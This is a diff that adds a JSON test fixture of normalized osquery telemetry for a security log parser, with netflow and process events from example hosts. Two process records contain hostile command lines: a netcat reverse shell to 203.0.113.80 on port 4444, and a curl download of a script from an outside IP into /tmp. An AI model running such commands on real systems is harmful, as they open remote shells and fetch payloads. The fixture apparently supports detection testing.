@@ -1,0 +1,121 @@
+[
+  {
+    "line": 1,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT > OSQUERY_SYSLOG_CHILD_NETFLOW",
+    "schema": "scwx.netflow",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792026150000000,
+      "event_time_fidelity": "MICRO",
+      "host_id": "web01.example.com",
+      "source_address": "192.0.2.15",
+      "destination_address": "203.0.113.80",
+      "source_port": 51544,
+      "destination_port": 4444,
+      "protocol": 6,
+      "event_metadata": {
+        "record": [
+          {
+            "key": "query_name",
+            "value": "pack_incident-response_open_sockets"
+          },
+          {
+            "key": "pid",
+            "value": "4021"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 2,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT > OSQUERY_SYSLOG_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792026300000000,
+      "event_time_fidelity": "MICRO",
+      "host_id": "web01.example.com",
+      "computer_name": "web01.example.com",
+      "process_id": "4021",
+      "commandline": "nc -e /bin/sh 203.0.113.80 4444",
+      "parent_process_id": "3990",
+      "image_path": "/usr/bin/nc",
+      "process": "nc",
+      "process_create_time_usec": 1792026295000000
+    }
+  },
+  {
+    "line": 3,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT > OSQUERY_SYSLOG_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792026641000000,
+      "event_time_fidelity": "MICRO",
+      "host_id": "db02.example.com",
+      "computer_name": "db02.example.com",
+      "process_id": "30121",
+      "commandline": "curl -s -o /tmp/x.sh http://198.51.100.9/x.sh",
+      "parent_process_id": "30090",
+      "image_path": "/usr/bin/curl",
+      "process": "curl"
+    }
+  },
+  {
+    "line": 4,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT > OSQUERY_SYSLOG_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792026729000000,
+      "event_time_fidelity": "MICRO",
+      "host_id": "db02.example.com",
+      "computer_name": "db02.example.com",
+      "process_id": "30410",
+      "commandline": "-bash",
+      "process": "bash",
+      "username": "adoe"
+    }
+  },
+  {
+    "line": 5,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT",
+    "schema": "scwx.generic",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792026900000000,
+      "host_id": "web01.example.com"
+    }
+  },
+  {
+    "line": 6,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT",
+    "schema": "scwx.generic",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792026900000000,
+      "host_id": "web01.example.com"
+    }
+  },
+  {
+    "line": 7,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT",
+    "schema": "scwx.generic",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792027202000000,
+      "host_id": "web01.example.com"
+    }
+  },
+  {
+    "line": 8,
+    "extractor_path": "OSQUERY_SYSLOG_PARENT",
+    "schema": "scwx.generic",
+    "normalized": {
+      "sensor_type": "osquery",
+      "event_time_usec": 1792027350000000,
+      "host_id": "web01.example.com"
+    }
+  }
+]
